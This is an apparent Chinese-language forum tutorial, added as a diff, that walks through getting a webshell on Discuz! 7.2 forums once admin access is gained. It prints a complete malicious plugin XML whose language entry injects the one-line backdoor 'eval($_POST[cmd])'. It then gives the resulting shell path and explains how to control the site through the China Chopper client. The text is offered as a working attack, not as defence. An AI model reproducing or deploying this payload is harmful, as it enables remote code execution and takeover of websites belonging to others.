@@ -1,0 +1,86 @@
+ Discuz！7.2 论坛相对获取Webshell 较难，在获取管理员权限后可以通过导入插件来获
+取Webshell，不过该漏洞在新版本中已经被修补了，仅对Discuz! 7.2 Release 20101020
+以下版本有效，插件导入漏洞产生原因是因为参数过滤不严格导致的。
+1.登录后台
+正常登录Discuz！7.2 论坛系统，登录后，如果具备管理员权限会在个人中心旁边有一个管
+理中心链接，单击该链接，再次输入用户名和密码，登录成功后进入后台管理，如图1 所示。
+ 
+前天 06:02 上传下载附件 (32.39 KB) 
+
+图1Discuz！7.2 后台管理
+2.论坛插件管理
+在后台管理主界面中单击“插件”进入论坛插件列表，如图2 所示，在论坛插件管理中会显
+示所有的论坛插件，如果插件未安装，这单击该界面插件列表中的具体插件名称后的“安装”
+链接，按照提示即可完成插件的安装。反之单击“卸载”链接可以将安装好的插件卸载掉。
+当一个插件安装成功后，还需要选中该插件的启用单选框，单击“提交”使其生效。
+ 
+前天 06:02 上传下载附件 (28.16 KB) 
+
+图2 论坛插件管理
+3.导入Discuz！7.2 提权Webshell 插件
+在论坛插件管理中单击“导入”按钮，如图3 所示，选择上传文件导入方式，在本案例中选
+择已经成好的dz7.2.xml 文件，同时选中“允许导入不同版本 Discuz! 的插件(易产生错
+误!!)”，单击“提交”导入插件，成功导入插件后会给出一个提示。
+ 
+前天 06:02 上传下载附件 (24.31 KB) 
+
+图3 导入Discuz！7.2 提权Webshell 插件
+Discuz！7.2 提权Webshell 插件漏洞实际上是由于插件导入时未对数据进行严格处理后导
+致的，其利用代码如下，将其保存为xml 文件即可。
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<root>
+<item id="Title"><![CDATA[Discuz! Plugin]]></item>
+<item id="Version"><![CDATA[7.2]]></item>
+<item id="Time"><![CDATA[2011-03-16 15:57]]></item>
+<item id="From"><![CDATA[Discuz! Board
+(http://www.antian365.com/)]]></item>
+<item id="Data">
+<item id="plugin">
+<item id="available"><![CDATA[0]]></item>
+<item id="adminid"><![CDATA[0]]></item>
+<item id="name"><![CDATA[wwwsite]]></item>
+<item id="identifier"><![CDATA[shell]]></item>
+<item id="description"><![CDATA[]]></item>
+<item id="datatables"><![CDATA[]]></item>
+<item id="directory"><![CDATA[]]></item>
+<item id="copyright"><![CDATA[]]></item>
+<item id="modules"><![CDATA[a:0:{}]]></item>
+<item id="version"><![CDATA[]]></item>
+</item>
+<item id="version"><![CDATA[7.2]]></item>
+<item id="language">
+<item id="scriptlang">
+<item
+id="a\"><![CDATA[=>1);eval($_POST[cmd])?>]]></item>
+</item>
+</item>
+</item>
+</root>
+
+复制代码4.启用导入的插件Webshell
+如图4 所示，插件导入成功后会在插件名称中显示，在本例中显示为wwwsite，选中该插件，
+然后单击“提交”按钮使安装的插件生效。如果未启用即使导入了插件也获取不了Webshell。
+ 
+前天 06:02 上传下载附件 (21.27 KB) 
+
+图4 启用导入的插件Webshell
+5.查看Webshell 地址
+Discuz ！ 7.2 插件漏洞获取的webshell 网站相对地址为
+“/forumdata/plugins/shell.lang.php”，如图5 所示，在本地打开后，可以看到在其中有
+一句话后门代码插入到该页面中。
+
+Webshell 的实际地址
+6.获取Webshell
+输入Webshell 的网页地址“http://localhost/dz7.2/forumdata/plugins
+/shell.lang.php”在网页中进行实际测试，如果未出现错误，则表示能够获取Webshell，
+如图6 所示，在中国菜刀中添加一条Webshell 记录。单击该记录即可获取Webshell，如图
+7 所示，可以对该网站进行各种操作。
+ 
+
+图6 添加Webshell 记录到中国菜刀
+
+
+图7 获取一句话Webshell
+
+
